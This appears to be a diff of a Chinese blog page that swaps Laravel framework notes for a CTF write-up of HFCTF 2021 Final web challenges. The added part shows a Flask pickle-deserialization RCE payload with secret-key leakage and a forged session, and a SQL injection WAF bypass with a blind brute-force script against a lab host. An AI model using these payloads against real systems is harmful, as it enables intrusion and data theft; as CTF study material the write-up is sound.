@@ -158,7 +158,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://nama769.github.io/2021/04/21/LaravelLearning/">
+    <link itemprop="mainEntityOfPage" href="https://nama769.github.io/2021/05/01/[HFCTF%202021%20Final]web/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -172,7 +172,7 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2021/04/21/LaravelLearning/" class="post-title-link" itemprop="url">LaravelLearning</a>
+            <a href="/2021/05/01/%5BHFCTF%202021%20Final%5Dweb/" class="post-title-link" itemprop="url">HFCTF 2021 Finalweb</a>
         </h2>
 
         <div class="post-meta">
@@ -181,16 +181,10 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
+              
 
-              <time title="创建时间：2021-04-21 21:58:03" itemprop="dateCreated datePublished" datetime="2021-04-21T21:58:03+08:00">2021-04-21</time>
+              <time title="创建时间：2021-05-01 21:58:03 / 修改时间：22:11:14" itemprop="dateCreated datePublished" datetime="2021-05-01T21:58:03+08:00">2021-05-01</time>
             </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-07-04 14:54:21" itemprop="dateModified" datetime="2021-07-04T14:54:21+08:00">2021-07-04</time>
-              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -198,10 +192,6 @@
               <span class="post-meta-item-text">分类于</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                   <a href="/categories/web/" itemprop="url" rel="index"><span itemprop="name">web</span></a>
-                </span>
-                  ，
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/web/CVE/" itemprop="url" rel="index"><span itemprop="name">CVE</span></a>
                 </span>
             </span>
 
@@ -216,162 +206,58 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h1 id="Laravel框架的学习"><a href="#Laravel框架的学习" class="headerlink" title="Laravel框架的学习"></a>Laravel框架的学习</h1><p>做题的时候经常看到laravel但又不知道是啥，百度后也云里雾里。好像是个php下的web框架，那就先把环境搭建起来吧。</p>
-<h2 id="0x00-laravel的搭建"><a href="#0x00-laravel的搭建" class="headerlink" title="0x00 laravel的搭建"></a>0x00 laravel的搭建</h2><p> 因为一开始真的啥也不知道，只好在网上搜教程。搜了很多感觉这几篇对小白很友好。</p>
+          <h1 id="easyflask"><a href="#easyflask" class="headerlink" title="easyflask"></a>easyflask</h1><p>进题目后先看到<code>/file?file=index.js</code>很容易得到<code>Here is a js file. Source at /app/source</code>。然后应该<code>/file?file=/app/source</code>得到源码。但我可能脑子有问题吧，一直试<code>/file?file=/app/source/index.js</code> 结果什么都没有，最后果然卡死在第一步 : ) 。</p>
+<p>在Kagami哥哥的帮助下，终于得到了源码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3.6</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, session</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&quot;SECRET_KEY&quot;</span>] = <span class="string">&quot;*******&quot;</span></span><br><span class="line"></span><br><span class="line">User = <span class="built_in">type</span>(<span class="string">&#x27;User&#x27;</span>, (<span class="built_in">object</span>,), &#123;</span><br><span class="line">    <span class="string">&#x27;uname&#x27;</span>: <span class="string">&#x27;test&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;is_admin&#x27;</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="string">&#x27;__repr__&#x27;</span>: <span class="keyword">lambda</span> o: o.uname,</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=(<span class="params"><span class="string">&#x27;GET&#x27;</span>,</span>)</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index_handler</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> session.get(<span class="string">&#x27;u&#x27;</span>):</span><br><span class="line">        u = pickle.dumps(User())</span><br><span class="line">        session[<span class="string">&#x27;u&#x27;</span>] = u</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;/file?file=index.js&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/file&#x27;</span>, methods=(<span class="params"><span class="string">&#x27;GET&#x27;</span>,</span>)</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">file_handler</span>():</span></span><br><span class="line">    path = request.args.get(<span class="string">&#x27;file&#x27;</span>)</span><br><span class="line">    path = os.path.join(<span class="string">&#x27;static&#x27;</span>, path)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(path) <span class="keyword">or</span> os.path.isdir(path) \</span><br><span class="line">            <span class="keyword">or</span> <span class="string">&#x27;.py&#x27;</span> <span class="keyword">in</span> path <span class="keyword">or</span> <span class="string">&#x27;.sh&#x27;</span> <span class="keyword">in</span> path <span class="keyword">or</span> <span class="string">&#x27;..&#x27;</span> <span class="keyword">in</span> path <span class="keyword">or</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> path:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;disallowed&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">        content = fp.read()</span><br><span class="line">    <span class="keyword">return</span> content</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/admin&#x27;</span>, methods=(<span class="params"><span class="string">&#x27;GET&#x27;</span>,</span>)</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">admin_handler</span>():</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        u = session.get(<span class="string">&#x27;u&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(u, <span class="built_in">dict</span>):</span><br><span class="line">            u = b64decode(u.get(<span class="string">&#x27;b&#x27;</span>))</span><br><span class="line">        u = pickle.loads(u)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;uhh?&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> u.is_admin == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;welcome, admin&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;who are you?&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>, debug=<span class="literal">False</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>知道了大概是python反序列化。下一步就是获得key。果然又卡住了。群友让我再看看源码，里面有个任意读取。再去看源码，确实有，但不会用。。。又再Kagami哥哥的帮助下，知道了linux的环境变量再<code>/proc/self/environ</code>里，得到<code>secret_key=glzjin22948575858jfjfjufirijidjitg3uiiuu</code></p>
+<p>然后就是rce，一开始也是不会的，，但百度后还是明白了些。知道有个<code>__reduce__</code>方法，再对象被pickle时被调用。所以通过重写此方法，便可以rec。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span>:</span></span><br><span class="line">    uname = <span class="string">&#x27;123&#x27;</span></span><br><span class="line">    is_admin = <span class="number">1</span></span><br><span class="line">    __repr__ = <span class="keyword">lambda</span> o: o.uname</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>, (<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;echo `cat /flag ` &gt; /f1ag&#x27;).read()&quot;</span>,))</span><br></pre></td></tr></table></figure>
+
+<p>然后再本地运行脚本，生成session。<code>.eJwtxksOgjAUAMCrmJ4AJJBAwqIQS_gZtUpLdzwSH5ha2Agi4e66cFazkhcJVrIDEhCkvKqQ_sVlnGR2I95WI9yPTueDkqqDjF9_96TtjyCjqTWXu1zQgFOanLszOJGGHo0SxwGWCOs9s9LYf0LCTJpQPPV0Ug_WqaUdC5PpWpyHXHGmWX4rMAzJtn0BiBswYw.YI07Bg.NkAe66dAOnYTZHn9l0D-Wsetbts</code>复制到题目中，访问/admin，报500错误，初步判断成功了。然后访问<code>/file?file=/f1ag</code>得到flag</p>
+<h1 id="hatenum"><a href="#hatenum" class="headerlink" title="hatenum"></a>hatenum</h1><p>首先阅读源码,在config.php里看到一些重要的东西。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sql_waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(preg_match(<span class="string">&#x27;/union|select|or|and|\&#x27;|&quot;|sleep|benchmark|regexp|repeat|get_lock|count|=|&gt;|&lt;| |\*|,|;|\r|\n|\t|substr|right|left|mid/i&#x27;</span>, <span class="variable">$str</span>))&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&#x27;Hack detected&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">num_waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\d&#123;9&#125;|0x[0-9a-f]&#123;9&#125;/i&#x27;</span>,<span class="variable">$str</span>))&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&#x27;Huge num detected&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>很好，把我会的都过滤了，甚至过滤了一些我压根不会的。但仔细看还是有课利用的地方：例如<code>()</code>就没有过滤。结合login函数中这行代码，</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$res</span> = <span class="keyword">$this</span>-&gt;conn-&gt;query(<span class="string">&quot;select * from users where username=&#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$password</span>&#x27;&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>可以在username中输入转义符将引号转义，造成引号错误闭合。实现万能密码。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;username&quot;</span>: <span class="string">&quot;admin\\&quot;</span>,</span><br><span class="line"><span class="string">&quot;password&quot;</span>: <span class="string">&quot;||1#&quot;</span>,</span><br><span class="line"><span class="string">&quot;code&quot;</span>: <span class="string">&quot;1&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>但还需要code才行。从Eki哥哥那里得到hint:<code>||1&amp;&amp;exp(709)#</code>刚看到的时候一脸懵逼，在本地试了一下后，明白了exp(710)会刚好造成溢出，女少口阿。又知道这道题和rlike有关</p>
+<blockquote>
+<p>然后我随着这个启发开启了一个智障的idea:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;username&quot;</span>: <span class="string">&quot;admin\\&quot;</span>,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>: <span class="string">&quot;||i&amp;&amp;exp(999)#&quot;</span>,</span><br><span class="line">            <span class="string">&quot;code&quot;</span>: <span class="string">&quot;1&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>由于执行exp(999)会溢出，再加上短路与。所以如果i=0,则不会报错，返回login fail;i=1,则造成溢出返回error。而事实确实如此。又学到rlike语句匹配返回1，否则返回0。心想这下成了！激动的把i换成rlike语句。却发现，笑死，根本不执行rlike语句，返回的全是error。</p>
+<p>我的理解：在i处的rlike语句应该被执行了，但并不会将执行结果无缘无故的返回。</p>
+</blockquote>
+<p>再向Eki大佬求助，茅塞顿开：<code>||exp(710-(··· rlike ···))</code>突然就明白自己的为啥不行了。。</p>
+<p>关于空格的绕过：</p>
 <ul>
-<li><a target="_blank" rel="noopener" href="https://learnku.com/docs/laravel-development-environment/8.x/development-environment-windows/9878">windows laravel搭建</a></li>
-<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/5510">Laravel入坑之CVE-2019-9081复现分析</a>（这个真的对小白友好吗？）</li>
-<li><a target="_blank" rel="noopener" href="https://learnku.com/docs/laravel/5.7">Laravel 5.7 中文文档</a>（这留着我慢慢啃吧）</li>
+<li>/**/</li>
+<li>通过加括号</li>
+<li>将空格变成换页键（chr(0x0c)）,换行符,tab键 。</li>
 </ul>
-<p>呜呜呜，花了几天，终于搭好了环境。看了好多好多教程。看了</p>
-<p><a target="_blank" rel="noopener" href="https://wiki.96.mk/Web%E5%AE%89%E5%85%A8/Laravel/%EF%BC%88CVE-2019-9081%EF%BC%89Laravel%205.7%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96rce/">CVE-2019-9081</a>发现远超我的能力范围。。。让我再多看几天，就这样吧。</p>
-<h2 id="0x01-laravel-5-7结构分析"><a href="#0x01-laravel-5-7结构分析" class="headerlink" title="0x01 laravel 5.7结构分析"></a>0x01 laravel 5.7结构分析</h2><p><a target="_blank" rel="noopener" href="https://laravel.com/docs/5.7/structure#the-root-app-directory">laravel 5.7官方帮助文档</a></p>
-<h3 id="app-文件夹-应用程序核心代码-包含大部分应用程序"><a href="#app-文件夹-应用程序核心代码-包含大部分应用程序" class="headerlink" title="app  文件夹  应用程序核心代码  包含大部分应用程序"></a>app  文件夹  应用程序核心代码  包含大部分应用程序</h3><ul>
-<li><p>Console(控制台)</p>
+<p>这道题可以用chr(0x0c)。</p>
+<p>再就是因为过滤了引号，所以要把字段转成十六进制。但题目对十六进制的长度进行了限制，天真的我一开始构造了一个<code>^.&#123;n&#125;x</code>想用这个把code爆出来。然而毫无疑问的超长了。题目限制的长度是4个十六进制数，那只能先简单爆一下前三位，然后再通过前3位爆第4位，再通过2，3，4位爆第5位······。但这种方法不100%可靠。事实也证明code也确实是精心构造的。</p>
+<p>payload如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str2hexnum</span>(<span class="params"><span class="built_in">str</span></span>):</span></span><br><span class="line">    hexhum=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">        hexhum=hexhum+<span class="built_in">hex</span>(<span class="built_in">ord</span>(i))[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">return</span> hexhum</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    url = <span class="string">&quot;http://a5e30dc5-7f68-40fb-ba57-2bbb4b96ae79.node3.buuoj.cn/&quot;</span></span><br><span class="line">    hatelist=string.digits+string.ascii_uppercase+string.ascii_lowercase</span><br><span class="line">    <span class="comment">#0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ</span></span><br><span class="line">    rel=<span class="string">&#x27;erg&#x27;</span></span><br><span class="line">    pay=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    payload=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    tem=<span class="string">&#x27;erg&#x27;</span></span><br><span class="line">    jud=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    error=<span class="number">0</span></span><br><span class="line">    tag=<span class="literal">True</span></span><br><span class="line">    <span class="keyword">while</span>(tag):</span><br><span class="line">        jud=str2hexnum(tem)</span><br><span class="line">        error=<span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> p <span class="keyword">in</span> hatelist:</span><br><span class="line">            pay = str2hexnum(p)</span><br><span class="line">            payload=<span class="string">&quot;||exp(710-(code rlike binary 0x&quot;</span>+jud+pay+<span class="string">&quot;))#&quot;</span></span><br><span class="line">            payload=payload.replace(<span class="string">&#x27; &#x27;</span>,<span class="built_in">chr</span>(<span class="number">0x0c</span>))</span><br><span class="line">            data = &#123;</span><br><span class="line">                <span class="string">&quot;username&quot;</span>: <span class="string">&quot;admin\\&quot;</span>,</span><br><span class="line">                <span class="string">&quot;password&quot;</span>: payload,</span><br><span class="line">                <span class="string">&quot;code&quot;</span>: <span class="string">&quot;1&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment"># print(data[&quot;password&quot;])</span></span><br><span class="line">            req = requests.post(url+<span class="string">&quot;/login.php&quot;</span>,data=data,allow_redirects=<span class="literal">False</span>)</span><br><span class="line">            <span class="built_in">print</span>(req.text)</span><br><span class="line">            <span class="keyword">if</span>(<span class="string">&#x27;fail&#x27;</span> <span class="keyword">in</span> req.text):</span><br><span class="line">                error = error + <span class="number">1</span></span><br><span class="line">                <span class="keyword">if</span> error &gt; <span class="number">1</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;more choices 1: &quot;</span> + rel+<span class="string">&#x27;\n2: &#x27;</span>+rel[:-<span class="number">1</span>]+p)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    rel=rel+p</span><br><span class="line">                    tem=tem[<span class="number">1</span>:]+p</span><br><span class="line">                    <span class="built_in">print</span>(rel)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure>
+
+<p>运行结果如下</p>
+<img src="/2021/05/01/%5BHFCTF%202021%20Final%5Dweb/hatenum1.png" class="">
+
+<p>可以看到code中应该又两个<code>gh2</code>一个后面是<code>3</code>，一个是<code>u</code>上图进行了<code>gh23</code>的情况。通过改变脚本中hatelist的字母和数字顺序，可以进行到<code>gh2u</code>的情况。如下图</p>
+<img src="/2021/05/01/%5BHFCTF%202021%20Final%5Dweb/hatenum2.png" class="">
+
+<p>可见这种情况陷入死循环，所以推断，<code>gh2u</code>在前，<code>gh23</code>在后</p>
+<p>二者结合得到code:<code>erghruigh2uygh23uiu32ig</code></p>
+<p>登录后拿到flag。</p>
 <blockquote>
-<p>为核心应用程序提供api,包含所有Artisan命令(artisan是laravel框架支持的一个自动化脚本命令环境，主要的作用是自动建立很多程序框架)</p>
+<p>我感觉我的登录方式有问题，在网站上登不上去。。。最后通过脚本得到cookie然后粘到网站，得到flag。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://a5e30dc5-7f68-40fb-ba57-2bbb4b96ae79.node3.buuoj.cn/&quot;</span></span><br><span class="line">data = &#123;</span><br><span class="line">                <span class="string">&quot;username&quot;</span>: <span class="string">&quot;admin\\&quot;</span>,</span><br><span class="line">                <span class="string">&quot;password&quot;</span>: <span class="string">&quot;||1#&quot;</span>,</span><br><span class="line">                <span class="string">&quot;code&quot;</span>: <span class="string">&quot;erghruigh2uygh23uiu32ig&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">req = requests.post(url+<span class="string">&quot;/login.php&quot;</span>,data=data,allow_redirects=<span class="literal">False</span>)</span><br><span class="line"><span class="built_in">print</span>(req.cookies)</span><br><span class="line"><span class="comment">#&lt;RequestsCookieJar[&lt;Cookie PHPSESSID=aiadnk9q961e9lskm9p1h0urlt for a5e30dc5-7f68-40fb-ba57-2bbb4b96ae79.node3.buuoj.cn/&gt;]&gt;</span></span><br></pre></td></tr></table></figure>
 </blockquote>
-<blockquote>
-<p>包含控制台内核(console kernel):注册自定义artisan命令,定义预定任务(scheduled tasks)</p>
-</blockquote>
-</li>
-<li><p>Http</p>
-<blockquote>
-<p>为核心应用程序提供api,包含<code>控制器(controllers)</code>,<code>中间件(middleware)</code>,<code>请求(requests)</code>和基本全部请求的处理逻辑</p>
-</blockquote>
-</li>
-<li><p>Providers 文件夹</p>
-<blockquote>
-<p>包含所有对于应用程序的<code>服务提供者(service providers)</code>。服务提供者通过在服务容器中绑定服务、注册事件或执行任何其他任务来引导应用程序，以便为传入的请求准备应用程序。</p>
-</blockquote>
-</li>
-<li><p>Exceptions 文件夹</p>
-<blockquote>
-<p>存储 <code>异常处理程序(exception handler)</code>,可放置程序抛出的异常</p>
-</blockquote>
-</li>
-<li><p>User.php</p>
-</li>
-<li><p>Broadcasting 文件夹 </p>
-<blockquote>
-<p>包含应用程序所有广播频道类(broadcast channel classes),目录默认不存在,创建第一个channel时创建</p>
-</blockquote>
-</li>
-<li><p>Events 文件夹</p>
-<blockquote>
-<p>目录默认不存在,包含事件类(event classes),在make:event后被创建</p>
-</blockquote>
-<blockquote>
-<p>提醒应用程序的其他部分<code>一个给定的操作已经发生</code>,降低程序复杂度和耦合度</p>
-</blockquote>
-</li>
-<li><p>Job 文件夹</p>
-<blockquote>
-<p>make:job 后被创建</p>
-</blockquote>
-<blockquote>
-<p>包含对于应用程序的<code>排队作业(queneable jobs)</code></p>
-</blockquote>
-<blockquote>
-<p>job可能由应用程序排队；或在请求的lifecycle内同步运行，此时它们是<code>指挥模式(command parttern)</code>，被称为‘命令’</p>
-</blockquote>
-</li>
-<li><p>Listeners (监听器)文件夹</p>
-<blockquote>
-<p>make:listener 后被创建</p>
-</blockquote>
-<blockquote>
-<p>包含处理events的classes，事件监听器接收事件实例并执行逻辑，以响应所触发的event。</p>
-<p>例如：a SendWelcomeEmail listener 处理  a UserRegistered event</p>
-</blockquote>
-</li>
-<li><p>Mail 文件夹</p>
-<blockquote>
-<p>make:mail 后被创建</p>
-</blockquote>
-<blockquote>
-<p>包含所有<code>表示应用程序发送emails的类</code>。Mail对象允许将构造email的所有逻辑封装在<strong>一个</strong>简单的类中，以使用<code>Mail::send</code>来发送。</p>
-</blockquote>
-</li>
-<li><p>Notifications (通知)文件夹</p>
-<blockquote>
-<p>make:notification 后被创建</p>
-</blockquote>
-<blockquote>
-<p>包含应用程序发送的所有事务性通知，例如有关应用程序中发生的事件的简单通知。Laravel的通知功能是通过各种驱动程序发送通知，例如电子邮件，Sack，SMS或存储在数据库中的通知。</p>
-</blockquote>
-</li>
-<li><p>Policies (策略)文件夹</p>
-<blockquote>
-<p>make:policy 后被创建</p>
-</blockquote>
-<blockquote>
-<p>包含应用程序的授权策略类(authorization policy classes)。策略用于确定用户是否可以对资源执行给定的操作。</p>
-</blockquote>
-</li>
-<li><p>Rules 文件夹</p>
-<blockquote>
-<p>make:rule 后被创建</p>
-</blockquote>
-<blockquote>
-<p>包含应用程序的自定义验证规则对象。规则用于将复杂的验证逻辑封装在一个简单的对象中。</p>
-<p>相关：<code>验证文件(validation documentation)</code></p>
-</blockquote>
-</li>
-<li><p>xxx 文件夹 </p>
-<blockquote>
-<p>make:xxx 后生成的类将在这里存储</p>
-<p>运行  <strong><code>php artisan list make</code></strong> 了解有关make的用法</p>
-</blockquote>
-</li>
-</ul>
-<h3 id="bootstrap-文件夹-引导"><a href="#bootstrap-文件夹-引导" class="headerlink" title="bootstrap 文件夹 引导"></a>bootstrap 文件夹 引导</h3><ul>
-<li>app.php  引导框架的文件</li>
-<li>cache 文件夹 包含性能优化的框架生成文件（路由、服务器缓存文件等）</li>
-<li></li>
-</ul>
-<h3 id="config-文件夹-应用程序的所有配置文件"><a href="#config-文件夹-应用程序的所有配置文件" class="headerlink" title="config 文件夹 应用程序的所有配置文件"></a>config 文件夹 应用程序的所有配置文件</h3><ul>
-<li></li>
-</ul>
-<h3 id="database-文件夹-有关数据库-可用来保存SQLite"><a href="#database-文件夹-有关数据库-可用来保存SQLite" class="headerlink" title="database 文件夹 有关数据库 可用来保存SQLite"></a>database 文件夹 有关数据库 可用来保存SQLite</h3><ul>
-<li></li>
-</ul>
-<h3 id="public-文件夹-包含资源"><a href="#public-文件夹-包含资源" class="headerlink" title="public 文件夹 包含资源"></a>public 文件夹 包含资源</h3><ul>
-<li>index.php 输入应用程序和配置自动加载的所有请求的入口点</li>
-<li>资源 例如图像、css、javascript</li>
-</ul>
-<h3 id="resources-文件夹-视图-views-及未编译的原始资源及所有语言文件"><a href="#resources-文件夹-视图-views-及未编译的原始资源及所有语言文件" class="headerlink" title="resources 文件夹 视图(views)及未编译的原始资源及所有语言文件"></a>resources 文件夹 视图(views)及未编译的原始资源及所有语言文件</h3><ul>
-<li>Lessass</li>
-<li>javascript</li>
-</ul>
-<h3 id="routes-文件夹-应用程序的所有路由定义"><a href="#routes-文件夹-应用程序的所有路由定义" class="headerlink" title="routes 文件夹 应用程序的所有路由定义"></a>routes 文件夹 应用程序的所有路由定义</h3><ul>
-<li><p>web.php  为应用程序注册web路由</p>
-<blockquote>
-<p>web middleware group 提供会话状态、CSRF保护、cookie加密</p>
-</blockquote>
-</li>
-<li><p>api.php 注册api路由</p>
-</li>
-<li><p>console.php</p>
-</li>
-<li><p>channels.php</p>
-</li>
-</ul>
-<h3 id="storage-文件夹-包含已编译的Blade-templates，基于文件的会话、文件缓存、框架生成的其他文件"><a href="#storage-文件夹-包含已编译的Blade-templates，基于文件的会话、文件缓存、框架生成的其他文件" class="headerlink" title="storage 文件夹 包含已编译的Blade templates，基于文件的会话、文件缓存、框架生成的其他文件"></a>storage 文件夹 包含已编译的Blade templates，基于文件的会话、文件缓存、框架生成的其他文件</h3><ul>
-<li><p>app 文件夹 存储应用程序生成的任何文件</p>
-<blockquote>
-<p>storage/app/public 存储用户生成文件,应可以公开访问</p>
-</blockquote>
-</li>
-<li><p>framework 文件夹 存储框架生成文件和缓存</p>
-</li>
-<li><p>logs 文件夹 应用程序日志文件</p>
-</li>
-</ul>
